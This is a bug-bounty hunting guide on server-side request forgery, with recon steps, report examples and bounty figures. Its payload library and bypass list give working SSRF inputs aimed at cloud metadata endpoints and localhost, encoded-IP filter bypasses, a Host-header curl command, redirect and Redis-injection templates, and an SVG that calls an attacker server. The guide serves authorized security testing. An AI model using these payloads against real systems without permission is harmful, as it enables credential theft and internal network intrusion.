---
category: ssrf
label: SSRF
report_count: 223
programs: [gitlab, ibb, reddit, kubernetes, deptofdefense, slack, shopify, nextcloud, phabricator, exness]
avg_bounty: 2100
max_bounty: 10000
severity_distribution: critical: 4, high: 13, medium: 19, low: 8, none: 1
---

## Overview

SSRF breaks the trust boundary between the application and its network environment, allowing attackers to coerce backend servers into making arbitrary requests. Developers often introduce SSRF by exposing user-controlled URLs to backend fetchers, misconfiguring proxy logic, or failing to restrict internal network access. The worst-case impact includes internal network scanning, credential theft (e.g., cloud metadata), and, when chained, remote code execution or privilege escalation.

## Root causes

- Direct use of user-supplied URLs in backend fetchers without allowlisting or validation.
- Incomplete or naive filtering of IPs, hostnames, or protocols (e.g., missing IPv6, DNS rebinding, URL parsing quirks).
- Trusting client-side validation or assuming frontend restrictions are sufficient.
- Overly permissive redirects or proxy logic that follows attacker-controlled Location headers.
- Misconfigured third-party integrations (e.g., webhooks, importers, PDF/image generators) that fetch external resources.
- Use of libraries or frameworks with unsafe defaults (e.g., CarrierWave, cURL, urllib, libuv).

## Attack surface

- Parameters or JSON fields accepting URLs (e.g., `{url}`, `{webhook_url}`, `{avatar_url}`, `{endpoint}`).
- Headers influencing backend requests (e.g., `Host`, `X-Forwarded-Host`, `X-Original-URL`).
- Features: project/repo importers, file/image/PDF generators, webhook/test connection endpoints, SAML/OAuth metadata import, GraphQL queries with URL fields, calendar subscriptions, notification server configs.
- Endpoint patterns: `/import`, `/webhook`, `/preview`, `/proxy`, `/download`, `/validate`, `/test-connection`, `/api/*/url`, `/metadata`, `/store`, `/callback`.
- Tech stacks: Ruby on Rails with CarrierWave, Node.js with libuv, Python urllib, Java with HttpClient, PHP cURL, Go net/http.
- Client-side hints: JS code referencing fetch/XHR to arbitrary URLs, GraphQL schemas with URL/string fields, admin/config panels for integrations.

## Recon checklist

1. Enumerate all parameters, JSON fields, and headers accepting URLs or hostnames via static analysis, OpenAPI/GraphQL schemas, and fuzzing.
2. Identify features that allow resource import, preview, or test (importers, webhooks, integrations, PDF/image generators).
3. Review client-side code for dynamic URL construction or user-controlled fetches.
4. Map all endpoints with `/import`, `/webhook`, `/proxy`, `/preview`, `/download`, `/validate`, `/test-connection`, `/metadata`, `/store`, `/callback` patterns.
5. Inspect server responses for error messages or timing differences when targeting internal vs. external hosts.
6. Check for third-party libraries or frameworks known for SSRF issues.
7. Review documentation or admin panels for integration points (SAML, OAuth, notifications, connections).
8. Probe for filter bypasses: test IPv6, mixed-encoding, DNS rebinding, and alternate URL representations.

## Hunt methodology

1. Identify all endpoints and features accepting user-supplied URLs or hostnames.
2. Submit requests with external URLs you control and observe for outbound traffic (Burp Collaborator, requestbin, etc.).
3. Test internal IPs (`127.0.0.1`, `localhost`, `169.254.169.254`, `metadata.google.internal`, `100.100.100.200`) and common internal hostnames.
4. Attempt filter bypasses: IPv6-mapped IPv4, octal/hex IPs, DNS rebinding, URL-encoded payloads, mixed-case schemes.
5. Manipulate headers (`Host`, `X-Forwarded-Host`) to influence backend request routing.
6. Abuse redirects: respond with `Location` headers pointing to internal resources and observe if the server follows.
7. Chain with newline injection or protocol confusion to target non-HTTP services (e.g., Redis, SMTP).
8. Analyze responses for data leakage, error messages, timing, or reflected content indicating SSRF success.

## Payload library

### Basic direct SSRF
**Technique**: Exploit features that fetch user-supplied URLs directly, with no filtering.
**How to apply**: Supply an internal or attacker-controlled URL in any parameter or field that triggers a backend fetch.
**Payload**:  
`{"{param}": "http://169.254.169.254/latest/meta-data/"}`  
or  
`GET /api/endpoint?{param}=http://127.0.0.1:80/`
**Observe**: Outbound request to your server or internal resource, data leakage, or error messages.
**Seen in**: Project importers, webhook endpoints, PDF/image generators.

### Filter bypass: IPv6, octal, hex, DNS rebinding
**Technique**: Bypass naive IP/hostname filters using alternate representations.
**How to apply**: Encode internal IPs as IPv6-mapped, octal, or hex; use DNS rebinding domains.
**Payload**:  
`http://[::ffff:127.0.0.1]/`  
`http://2130706433/`  
`http://0x7f000001/`  
`http://rebind.{yourdomain}.com/`
**Observe**: Backend requests to internal resources, despite filters.
**Seen in**: Webhook/test endpoints, calendar subscriptions, importers.

### Host header injection
**Technique**: Manipulate the `Host` header to redirect backend requests to arbitrary hosts.
**How to apply**: Send requests with a custom `Host` header targeting an internal or attacker-controlled host.
**Payload**:  
`curl -H "Host: 127.0.0.1" https://target/api/endpoint`
**Observe**: Server-side request to the specified host, possible data leakage or error.
**Seen in**: OAuth callback flows, reverse proxy logic, GraphQL APIs.

### Redirect-based SSRF
**Technique**: Abuse backend fetchers that follow redirects, allowing attacker to steer requests to internal resources.
**How to apply**: Respond to initial fetch with a `302 Location: http://127.0.0.1/` header.
**Payload**:  
Attacker-controlled server responds with:  
`HTTP/1.1 302 Found\nLocation: http://169.254.169.254/latest/meta-data/\n\n`
**Observe**: Server follows redirect to internal resource.
**Seen in**: Importers, webhook test flows, SAML/OAuth metadata import.

### Protocol confusion / newline injection
**Technique**: Exploit backend fetchers that allow protocol confusion or newline injection to target non-HTTP services.
**How to apply**: Supply a URL or parameter value that injects newlines or uses a non-HTTP protocol (e.g., `redis://`).
**Payload**:  
`http://127.0.0.1:6379/\n<redis-payload>`
**Observe**: Outbound connection to non-HTTP service, possible command execution or data leakage.
**Seen in**: Webhook integrations, importers with weak parsing.

### SVG/image/PDF generator SSRF
**Technique**: Inject external URLs into SVG, image, or PDF templates processed server-side.
**How to apply**: Embed `<image xlink:href="http://{yourserver}/file">` or similar in uploaded SVG/PDF templates.
**Payload**:  
`<svg><image xlink:href="http://{yourserver}/file" /></svg>`
**Observe**: Server fetches external resource, request appears in logs.
**Seen in**: Logo generators, packing slip templates, emblem editors.

### Third-party library quirks (cURL, urllib, libuv)
**Technique**: Exploit parsing inconsistencies or unsafe defaults in popular libraries.
**How to apply**: Use crafted URLs that exploit parsing bugs (e.g., `http://example.com#@internal/`).
**Payload**:  
`http://example.com#@127.0.0.1/`
**Observe**: Server connects to unintended host.
**Seen in**: Any endpoint using affected libraries for HTTP requests.

### TURN/WebRTC proxy abuse
**Technique**: Abuse TURN/STUN servers to proxy arbitrary TCP/UDP traffic to internal network.
**How to apply**: Specify internal IPs/ports in TURN connection setup.
**Payload**:  
Set peer address to `10.0.0.1:80` or `169.254.169.254:80` in TURN protocol messages.
**Observe**: Internal network access, metadata service exposure.
**Seen in**: TURN relay features, WebRTC integrations.

## Filter & WAF bypass

- IPv6-mapped IPv4: `http://[::ffff:127.0.0.1]/`
- Decimal, octal, hex: `http://2130706433/`, `http://0177.0.0.1/`, `http://0x7f000001/`
- DNS rebinding: use attacker-controlled DNS to resolve to internal IP after initial request
- URL-encoded payloads: `http://127.0.0.1%2F%2F/`
- Mixed-case schemes: `HtTp://169.254.169.254/`
- Newline injection: `%0a`, `%0d%0a` in parameters or headers
- Fragment confusion: `http://example.com#@internal/`
- Host header smuggling: `Host: 127.0.0.1`
- Unicode/IDN: `http://xn--localhost-9za/`

## Verification & impact

- **Confirmed vulnerable**: Outbound request to attacker-controlled server, access to internal resource, data leakage (e.g., cloud metadata), or error messages indicating internal access.
- **False positive signals**: No outbound request, generic error with no timing difference, or response identical for internal and external hosts.
- **Impact escalation**: Use SSRF to access cloud metadata endpoints, internal admin panels, or non-HTTP services (e.g., Redis) for credential theft or RCE. Chain with newline injection or open redirect for privilege escalation.

## Triage & severity

- Typical CVSS: Medium to High (6.5–9.0), Critical if cloud credentials or RCE is possible.
- Severity up: Unauthenticated SSRF, access to sensitive internal services, credential exfiltration, ability to target non-HTTP protocols, or proxy arbitrary traffic.
- Severity down: Authenticated/privileged access required, sandboxed fetcher, limited to external hosts, or strong egress controls.

## Reporting tips

- Strong PoC: Minimal reproducible steps, clear evidence of internal/external request, and impact demonstration (e.g., metadata leak, internal service access).
- Avoid: Reports with only theoretical impact, no evidence of server-side request, or only client-side fetches.
- Evidence checklist: Request/response logs, server logs showing outbound request, screenshots of data leakage, Collaborator/requestbin hits, and impact statement.

## Real examples

- 826361 — gitlab: SSRF via project import using CarrierWave remote_attachment_url, enabling arbitrary file fetch and attachment (high, $10,000)
- 1960765 — reddit: Blind SSRF in Matrix chat preview_link API, enabling internal service enumeration and potential RCE (high, $6,000)
- 776017 — kubernetes: Half-blind SSRF in cloud-controller-manager, escalated to full SSRF via redirect, enabling internal network access (high, $5,000)
- 2585385 — ibb: SSRF in Apache HTTP Server on Windows via UNC path, leaking NTLM hashes (high, $4,920)
- 2429894 — ibb: SSRF via improper domain lookup in libuv, bypassing IP filters with crafted hostnames (high, $4,860)
- 398799 — gitlab: Unauthenticated blind SSRF in OAuth Jira authorization controller, arbitrary internal POSTs (high, $4,000)
- 1628209 — deptofdefense: SSRF in PDF generator, exfiltrating AWS credentials via injected JS in PDF (critical, $4,000)
- 333419 — slack: TURN server allowed TCP/UDP proxying to internal network and metadata services (critical, $3,500)
- 374737 — security: Blind SSRF via Sentry misconfiguration, GET requests to arbitrary URLs from error reporting (low, $3,500)
- 855276 — gitlab: SSRF via injection of http.* git config settings, abusing proxy config in import URL (high, $3,000)

## Bounty intelligence

Payouts for SSRF range from a few hundred to $10,000+, with critical impact (cloud credential theft, RCE, or internal network pivot) commanding the highest rewards. SaaS platforms, cloud providers, and developer tools pay most for unauthenticated or filter-bypass SSRF, especially when exploit chains are demonstrated. Programs reward higher for creative filter bypasses, protocol confusion, and evidence of real-world impact (e.g., AWS metadata exfiltration).